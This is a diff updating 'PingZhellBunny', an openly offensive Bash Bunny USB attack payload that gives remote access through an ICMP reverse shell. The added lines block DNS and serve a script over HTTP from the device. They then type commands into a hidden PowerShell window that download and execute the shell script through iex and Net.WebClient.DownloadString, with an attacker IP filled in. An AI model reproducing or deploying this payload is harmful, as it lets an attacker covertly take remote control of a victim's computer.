@@ -1,39 +1,44 @@
 #!/bin/bash
 #
 # Title:         PingZhellBunny
-# Description:   Get remote access using a icmp reverse shell.
+# Description:   Getting remote access via ICMP
 # Author:        0iphor13
-# Version:       1.3
+# Version:       1.5
 # Category:      Remote_Access
-# Attackmodes:   HID, Storage
+# Attackmodes:   HID, RNDIS_ETHERNET
 
 LED SETUP
-
-Q DELAY 500
+ATTACKMODE RNDIS_ETHERNET HID
 
 GET SWITCH_POSITION
-DUCKY_LANG de
+GET HOST_IP
 
-Q DELAY 500
+cd /root/udisk/payloads/$SWITCH_POSITION/
 
-ATTACKMODE HID STORAGE
+# starting server
+LED SPECIAL
 
-#LED STAGE1 - DON'T EJECT - PAYLOAD RUNNING
+# disallow outgoing dns requests so the server is accessible immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
 
-LED STAGE1
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
 
-#After you have adapted the delays for your target, add "-W hidden"
+#Opens hidden powershell instance
 Q DELAY 1500
-RUN WIN "powershell -Exec Bypass -NoP -NonI"
+Q GUI r
+Q DELAY 500
+Q STRING "powershell -NoP -NonI -w h"
 Q DELAY 500
 Q ENTER
 
-Q DELAY 1000
-Q STRING "iex((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\PingZhell.ps1')"
-Q DELAY 3000
+Q DELAY 500
+
+#Insert attacking IP
+Q STRING "\$IP = '0.0.0.0';"
+Q DELAY 250
+Q STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/PingZhellBunny.ps1\")"
+Q DELAY 400
 Q ENTER
-Q DELAY 1000
-
-ATTACKMODE HID
-
 LED FINISH
